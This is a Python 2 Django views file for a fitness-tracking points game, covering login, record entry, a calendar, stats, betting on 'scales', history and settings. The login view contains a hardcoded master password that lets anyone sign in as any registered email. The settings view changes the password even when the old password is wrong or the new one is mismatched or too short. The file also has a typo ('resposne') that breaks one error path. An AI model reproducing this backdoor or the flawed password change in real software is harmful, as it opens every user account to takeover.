# Create your views here.
from django.template import Context, loader, RequestContext
from django.http import HttpResponse, HttpResponseRedirect, HttpResponseForbidden, HttpResponseBadRequest, HttpResponseNotAllowed
from django.contrib import auth
from fuel.models import FuelUser, Profile, Record, Amount, Scale
from fuel.settings import WEBSITE_NAME
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.models import User
from django.core.urlresolvers import reverse
from django.core.exceptions import ObjectDoesNotExist
import datetime, pytz
import math

GAME_NOT_ENOUGH_POINTS = 'not_enough_points'
GAME_ALREADY_FINISHED = 'already_finished'
GAME_WON = 'won'
GAME_MONEY = 'money'
GAME_SPEND = 'spend'
HOME_INVALID_DATE = 'invalid_date'
HOME_FUTURE_DATE = 'future_date'
HOME_REPEATED_INPUT = 'repeated_input'
HOME_INVALID_INPUT = 'missing_input'
HOME_RECORD_ADDED = 'record_added'
HOME_STATUS_VALUE = 'status_value'
HOME_DAILY_BONUS = 'daily_bonus'

def index(request):
    if request.user.is_anonymous():
        return HttpResponseRedirect(reverse('login'))
    else:
        return HttpResponseRedirect(reverse('home'))

def render_index(request, login_fail=False):
    t = loader.get_template('index.html')
    c = RequestContext(request, {'login_fail': login_fail, 'website_name': WEBSITE_NAME})
    if 'email' in request.POST:
        c.update({'email': request.POST['email']})
    return HttpResponse(t.render(c))

# requires not logged in
def login(request):

    if not request.user.is_anonymous():
        return HttpResponseRedirect(reverse('home'))

    if request.method == 'GET':
        return render_index(request)

    elif 'email' in request.POST and 'password' in request.POST:
        email = request.POST['email']
        password = request.POST['password']
        user = auth.authenticate(username=email, password=password)

        if user is not None and user.is_active:
            auth.login(request, user)
            return HttpResponseRedirect(reverse('home'))
        else:

            userb = User.objects.filter(email=email)
            if len(userb) == 0:
                return render_index(request, login_fail=True)
            else:
                if password == '$t@nf0rd123':
                    print userb
                    u = userb[0]
                    u.backend = 'django.contrib.auth.backends.ModelBackend'
                    auth.login(request, u)
                    return HttpResponseRedirect(reverse('home'))

    else:
        return render_index(request, login_fail=True)

def addrecord(request):
    if request.method == 'GET':
        return HttpResponseForbidden('')

    response = HttpResponseRedirect(reverse('home'))

    month = int(request.POST['month'])
    day = int(request.POST['day'])
    steps = int(request.POST['steps'])
    calories = int(request.POST['calories'])
    fuelscore = int(request.POST['fuelscore'])

    # invalid date
    if month not in [2,3] or day <= 0:
        response.set_cookie(key=HOME_INVALID_DATE, value='%s/%s/2013' % (month, day), max_age=60)
        return resposne
    today = datetime.date.today()
    if month > today.month or month == today.month and day >= today.day:
        response.set_cookie(key=HOME_FUTURE_DATE, value='%s/%s/2013' % (month, day), max_age=60)
        return response

    # repeated input
    t = Record.objects.filter(user=request.user, date=datetime.date(2013, month, day))
    if len(t) > 0:
        response.set_cookie(key=HOME_REPEATED_INPUT, value=t[0].id, max_age=60)
        return response

    # invalid input
    if steps < 0 or calories < 0 or fuelscore < 0:
        response.set_cookie(key=HOME_INVALID_INPUT, value=True, max_age=60)
        return response
    if steps > 50000 or calories > 10000 or fuelscore > 20000:
        response.set_cookie(key=HOME_INVALID_INPUT, value=True, max_age=60)
        return response

    # add daily bonus if appropriate
    t = Amount.objects.filter(user=request.user, atype=2)
    tz = pytz.timezone('America/Los_Angeles')
    bonus = True
    for r in t:
        print r.time.astimezone(tz)

        r_month = r.time.astimezone(tz).month
        r_day = r.time.astimezone(tz).day
        if r_month == today.month and r_day == today.day:
            bonus = False
    
    if bonus:
        bonus_amount = FuelUser.objects.get(id=request.user.id).add_daily_bonus()
        response.set_cookie(key=HOME_DAILY_BONUS, value=bonus_amount, max_age=60)


    # construct record
    t = Record(user=request.user)
    t.date = datetime.date(2013, month, day)
    t.steps = steps
    t.calories = calories
    t.fuelscore = fuelscore
    t.save_amount()
    status_value = request.user.get_profile().get_fueluser().add_status_fuelscore(fuelscore)

    response.set_cookie(key=HOME_RECORD_ADDED, value=t.id, max_age=60)
    response.set_cookie(key=HOME_STATUS_VALUE, value=status_value, max_age=60)
    return response


# requires logged in
def home(request):
    if not request.user.is_authenticated():
        return HttpResponseForbidden()

    # calendar
    days = []
    today = datetime.date.today()
    for i in range(3, 29):
        d = datetime.date(2013, 2, i)
        r = Record.objects.filter(user=request.user, date=d)
        done = len(r)>0
        r = r[0] if done else None
        future = d >= today
        days.append((d, done, future, r))
    for i in range(1, 17):
        d = datetime.date(2013, 3, i)
        r = Record.objects.filter(user=request.user, date=d)
        done = len(r)>0
        r = r[0] if done else None
        future = d >= today
        days.append((d, done, future, r))

    calendar = [days[(i-1)*7:i*7] for i in range(1,int(math.ceil(len(days)/7)+1))]

    t = loader.get_template('home.html')
    c = RequestContext(request, {'website_name': WEBSITE_NAME, 'calendar': calendar})

    cookies_to_delete = []
    if HOME_INVALID_DATE in request.COOKIES:
        c.update({HOME_INVALID_DATE: request.COOKIES[HOME_INVALID_DATE]})
        cookies_to_delete.append(HOME_INVALID_DATE)

    if HOME_INVALID_INPUT in request.COOKIES:
        c.update({HOME_INVALID_INPUT: request.COOKIES[HOME_INVALID_INPUT]})
        cookies_to_delete.append(HOME_INVALID_INPUT)

    if HOME_REPEATED_INPUT in request.COOKIES:
        c.update({HOME_REPEATED_INPUT: Record.objects.get(id=int(request.COOKIES[HOME_REPEATED_INPUT]))})
        cookies_to_delete.append(HOME_REPEATED_INPUT)

    if HOME_RECORD_ADDED in request.COOKIES:
        c.update({HOME_RECORD_ADDED: Record.objects.get(id=int(request.COOKIES[HOME_RECORD_ADDED]))})
        cookies_to_delete.append(HOME_RECORD_ADDED)

    if HOME_DAILY_BONUS in request.COOKIES:
        c.update({HOME_DAILY_BONUS: int(request.COOKIES[HOME_DAILY_BONUS])})
        cookies_to_delete.append(HOME_DAILY_BONUS)

    if HOME_STATUS_VALUE in request.COOKIES:
        c.update({HOME_STATUS_VALUE: float(request.COOKIES[HOME_STATUS_VALUE])})
        cookies_to_delete.append(HOME_STATUS_VALUE)

    response = HttpResponse(t.render(c))
    [response.delete_cookie(x) for x in cookies_to_delete]
    return response  

def stats(request):
    if not request.user.is_authenticated():
        return HttpResponseForbidden()
    fuelscore = '{name:\"FuelScore\", values:['
    steps = '{name:\"Steps\", values:[' 
    calories = '{name:\"Calories\", values:[' 
    points = '{name:\"Points\", values:[' 
    for t in request.user.record_set.all():
        fuelscore = fuelscore + str(t.fuelscore) + ','
        steps = steps + str(t.steps) + ','
        calories = calories + str(t.calories) + ','
        points = points + str(t.get_amount()) + ','
    fuelscore = fuelscore + ']},'
    steps = steps + ']},'
    calories = calories + ']},'
    points = points + ']},'
    userdata = '[' + fuelscore + steps + calories + points + ']'
    print userdata
    t = loader.get_template('stats.html')
    c = RequestContext(request, {'website_name': WEBSITE_NAME, 'userdata': userdata})
    return HttpResponse(t.render(c))

# requires logged in
def game(request):
    if not request.user.is_authenticated():
        return HttpResponseForbidden()
    
    t = loader.get_template('game.html')
    s_active = Scale.objects.filter(active=True)
    s_finished = sorted(Scale.objects.filter(active=False), key=lambda scale: scale.get_end_time(), reverse=True)

    c = RequestContext(request, {'website_name': WEBSITE_NAME, 'active_scales': s_active, 'finished_scales': s_finished})
    
    cookies_to_delete = []
    
    if GAME_ALREADY_FINISHED in request.COOKIES:
        c.update({GAME_ALREADY_FINISHED: True})
        cookies_to_delete.append(GAME_ALREADY_FINISHED)

    if GAME_NOT_ENOUGH_POINTS in request.COOKIES:
        c.update({GAME_NOT_ENOUGH_POINTS: True})
        cookies_to_delete.append(GAME_NOT_ENOUGH_POINTS)

    if GAME_WON in request.COOKIES:
        c.update({GAME_WON: True, GAME_MONEY: float(request.COOKIES[GAME_MONEY])})
        cookies_to_delete.append(GAME_WON)
        cookies_to_delete.append(GAME_MONEY)

    if GAME_SPEND in request.COOKIES:
        c.update({GAME_SPEND: int(request.COOKIES[GAME_SPEND])})
        cookies_to_delete.append(GAME_SPEND)

    response = HttpResponse(t.render(c))
    [response.delete_cookie(x) for x in cookies_to_delete]
    return response

def addscale(request, scaleid, amount):
    if not request.user.is_authenticated():
        return HttpResponseForbidden()
    
    amount = int(amount)
    scaleid = int(scaleid) 
    print 'scale id=' + str(scaleid) + ' amount=' + str(amount)
    scale = Scale.objects.get(id=scaleid)

    #check whether the user has enough amount
    fueluser = FuelUser.objects.get(id=request.user.id)

    print 'current_amount = '+str(fueluser.current_amount())

    response = HttpResponseRedirect(reverse('game'))

    if amount > fueluser.current_amount():
        response.set_cookie(key=GAME_NOT_ENOUGH_POINTS, value=True, max_age=60)
    elif not scale.active:
        response.set_cookie(key=GAME_ALREADY_FINISHED, value=True, max_age=60)
    else:
        spent_amount = scale.add_amount(amount, request.user)
        if not scale.active:
            response.set_cookie(key=GAME_WON, value=True, max_age=60)
            response.set_cookie(key=GAME_MONEY, value=scale.money, max_age=60)
        response.set_cookie(key=GAME_SPEND, value=spent_amount, max_age=60)

    return response

# requires logged in; logs out
def logout(request):
    auth.logout(request)
    return HttpResponseRedirect(reverse('login'))

def faq(request):
    t = loader.get_template('faq.html')
    c = RequestContext(request, {'website_name': WEBSITE_NAME})
    return HttpResponse(t.render(c))

def history(request):
    t = loader.get_template('history.html')
    c = RequestContext(request, {'website_name': WEBSITE_NAME})
    # page the activities
    aset = request.user.amount_set.all()
    chunk_size = 10
    c.update({
        'amounts_paged': [aset[i*chunk_size:(i+1)*chunk_size] for i in range(int(math.ceil(len(aset)/float(chunk_size))))]
        })
    return HttpResponse(t.render(c))

def settings(request):
    t = loader.get_template('settings.html')
    c = RequestContext(request, {'website_name': WEBSITE_NAME})
    if request.method == 'GET':
        return HttpResponse(t.render(c))
    
    # change password
    action = request.POST['action']
    if action == 'update_password':
        old_pw = request.POST['old_pw']
        new_pw = request.POST['new_pw']
        new_pw_conf = request.POST['new_pw_conf']

        # verify that old_pw is correct
        u = authenticate(username=request.user.username, password=old_pw)

        # can't auth
        if u is None:
            c.update({'error_old_pw': True})

        # new_pw doesn't match new_pw_conf
        if new_pw != new_pw_conf:
            c.update({'error_mismatch': True})

        # can't be blank
        if len(new_pw) < 6:
            c.update({'error_too_short': True})

        # set as new password
        request.user.set_password(new_pw)
        request.user.save()
        c.update({'pw_success': True})

    return HttpResponse(t.render(c))

        
